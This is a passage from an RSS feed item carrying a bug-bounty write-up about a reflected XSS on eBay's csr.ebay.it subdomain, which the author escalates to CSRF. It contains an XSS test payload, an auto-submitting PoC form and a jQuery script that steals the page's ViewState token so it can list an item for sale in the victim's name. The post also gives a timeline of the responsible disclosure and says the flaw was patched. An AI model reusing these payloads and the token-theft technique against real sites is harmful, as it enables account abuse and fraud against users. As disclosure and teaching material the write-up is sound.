  &lt;li&gt;Ebay is a pretty high level profile website and has a &lt;strong&gt;Bug Bounty program&lt;/strong&gt; which awards with a mention in their Security Researchers Acknowledgement page;&lt;/li&gt;
  &lt;li&gt;Ebay doens’t offer a cash award (yes this doesn’t seem to be a pro but this means that &lt;strong&gt;not so many people have tested it&lt;/strong&gt; unlike Google and Facebook);&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When trying to find a security issue the best place to &lt;strong&gt;search&lt;/strong&gt; is &lt;strong&gt;where other people hasn’t already looked at&lt;/strong&gt;, so let’s forgot for a moment the main page and let’s search in some other subdomains. Two great tools to discover subdomains are &lt;a href=&quot;https://github.com/fwaeytens/dnsenum&quot;&gt;dnsenum&lt;/a&gt; and &lt;a href=&quot;http://tools.kali.org/information-gathering/fierce&quot;&gt;fierce&lt;/a&gt;. Looking around I found &lt;strong&gt;csr.ebay.it&lt;/strong&gt; which seems to handle the process of selling items as a merchant. Between the different requests sent to this domain a POST request to &lt;code&gt;http://csr.ebay.it/cse/results.jsf&lt;/code&gt; caught my attention because it has a &lt;code&gt;keyword&lt;/code&gt; parameter which is reflected in the response.&lt;/p&gt;

&lt;div class=&quot;full zoomable&quot;&gt;
  &lt;img src=&quot;/images/ebay/burp_ebay.png&quot; /&gt;
&lt;/div&gt;

&lt;p&gt;A good payload which I use to test for XSS is  &lt;code&gt;xxx&quot;&amp;gt;&amp;lt;svg/onload=alert(1)&amp;gt;&lt;/code&gt; because it provides two functionalities:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;The string &lt;code&gt;xxx&lt;/code&gt;  is very unlikely to be present in the page so by &lt;strong&gt;inspecting the source code&lt;/strong&gt; of the HTML page and searching for &lt;code&gt;xxx&lt;/code&gt; I can discover the &lt;strong&gt;location where my input has been reflected&lt;/strong&gt;;&lt;/li&gt;
  &lt;li&gt;The rest of the payload &lt;code&gt;&quot;&amp;gt;&amp;lt;svg/onload=alert(1)&amp;gt;&lt;/code&gt; may &lt;strong&gt;trigger a XSS vulnerability&lt;/strong&gt; popping up an alert box;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;So we intercept the request to http://csr.ebay.it/cse/results.jsf  using &lt;a href=&quot;http://portswigger.net/burp/&quot;&gt;Burp&lt;/a&gt; edit the &lt;code&gt;keyword&lt;/code&gt; field with &lt;code&gt;&quot;&amp;gt;&amp;lt;svg/onload=alert(1)&amp;gt;&lt;/code&gt;, submit the request and wait for:&lt;/p&gt;

&lt;div class=&quot;full zoomable&quot;&gt;
  &lt;img src=&quot;/images/ebay/ebay_xss.jpg&quot; /&gt;
&lt;/div&gt;

&lt;p&gt;Yay!!! This is our lucky day but wait a minute where is the session cookie?&lt;/p&gt;

&lt;div class=&quot;full zoomable&quot;&gt;
  &lt;img src=&quot;/images/ebay/session_cookie.png&quot; /&gt;
&lt;/div&gt;

&lt;p&gt;Oh no. The session cookie is set &lt;code&gt;HttpOnly&lt;/code&gt; this means that it is &lt;strong&gt;not accessible through javascript&lt;/strong&gt;, bye bye session hijacking but let’s see what we could do with it.
Let’s first create our PoC page; this is very straightforward, we just need to create an html form containing the fields and the value which we want to submit and submit it as soon as the user visit the page.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;https://code.jquery.com/jquery-2.1.3.min.js&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;myform&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://csr.ebay.it/cse/results.jsf?sbh=true&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;keywords&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;keywords&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;amp;quot;&amp;gt;&amp;lt;svg/onload=alert(document.domain+document.cookie)&amp;gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;btnStartGandalf&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;btnStartGandalf&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Inizia&amp;quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;startPage&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;startPage&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;true&amp;quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;pageName&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;pageName&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;start&amp;quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ready&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;#myform&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&quot;from-xss-to-csrf&quot;&gt;From XSS to CSRF&lt;/h3&gt;

&lt;p&gt;I won’t bother you on what a CSRF attack is, there are &lt;a href=&quot;http://haacked.com/archive/2009/04/02/anatomy-of-csrf-attack.aspx/&quot;&gt;very good explanation&lt;/a&gt; out there, the only thing to know is that this attack can be exploited to &lt;strong&gt;make the user do unwanted actions&lt;/strong&gt; and can be prevented by attaching a hidden field &lt;code&gt;csrf_token&lt;/code&gt; to the form which will be submitted.
Let’s recapt what we know so far:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;we can run javascript code through the &lt;strong&gt;XSS in crs.ebay.it&lt;/strong&gt;;&lt;/li&gt;
  &lt;li&gt;crs.ebay.it domain enables the user to &lt;strong&gt;sell items&lt;/strong&gt;;&lt;/li&gt;
  &lt;li&gt;the selling functionality is &lt;strong&gt;protected against CSRF&lt;/strong&gt; through a hidden token in the form;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Attack plan: exploit the XSS to &lt;strong&gt;exfiltrate the CSRF token&lt;/strong&gt; and use it to make a request in the behalf of the user.
We modify the payload before and instead of displaying an alert message (&lt;code&gt;&quot;&amp;gt;&amp;lt;svg/onload=alert(1)&amp;gt;&lt;/code&gt;) we include a script which:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Send a GET request to the page containing the token;&lt;/li&gt;
  &lt;li&gt;Parse the page to get the token value (in our case the javax.faces.ViewState field);&lt;/li&gt;
  &lt;li&gt;Send a post request to &lt;code&gt;http://csr.ebay.it/cse/list.jsf&lt;/code&gt; to publish the product with the fields which we have set in the form validated with the csrf token which we have exfiltrated before;&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;c1&quot;&gt;//Generate the form which will be send to sell the item&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;form&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;myform&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;method&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;post&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;action&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;http://csr.ebay.it/cse/list.jsf&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;input&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;i1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;type&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;text&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;i1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;title&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;i1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;value&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Iphone6&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;here&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;all&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;other&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fields&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sell&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;input&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;i2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;type&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;text&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;i2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;javax.faces.ViewState&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;i2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;javax.faces.ViewState&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;i2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;value&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;


&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;input&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;type&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;value&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Submit&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;


&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ready&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;http://csr.ebay.it/cse/list.jsf?usecase=create&amp;amp;mode=AddItem&amp;amp;categoryId=30095&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;get&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;//1 sending a get request to the page containing the token&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;parseHTML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;//2 parsing the html to find the token value&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;input[name=&amp;quot;javax.faces.ViewState&amp;quot;]&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;//3 setting this value to the csrf_token field in the constructed form&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;input[id=&amp;#39;javax.faces.ViewState&amp;#39;]&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;//4 submitting the form&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;#myform&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Hooray!! We have made the victim, which click on our link, sell an Iphone 6.
&lt;strong&gt;Kudos to the Ebay security team&lt;/strong&gt; which has been very responsive and patched the vulnerability in a week.
I think that, at the moment, the security level of Ebay is not enough strong considering the sensitive informations and the profitable actions which the platform provide, so I keep wondering why Ebay hasn’t already started a  payment based Bug Bounty program on platforms like Hackerone or Bugcrowd.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;7 April 2015 Vulnerability reported to Ebay Security Team&lt;/li&gt;
  &lt;li&gt;15 April 2015 Vulnerability patched&lt;/li&gt;
  &lt;li&gt;25 May 2015 Added to the Responsible Disclosure Acknowledgements page&lt;/li&gt;
  &lt;li&gt;20 June 2015 Public disclosure&lt;/li&gt;
&lt;/ul&gt;

</description>
    </item>
    
    

  </channel> 
</rss>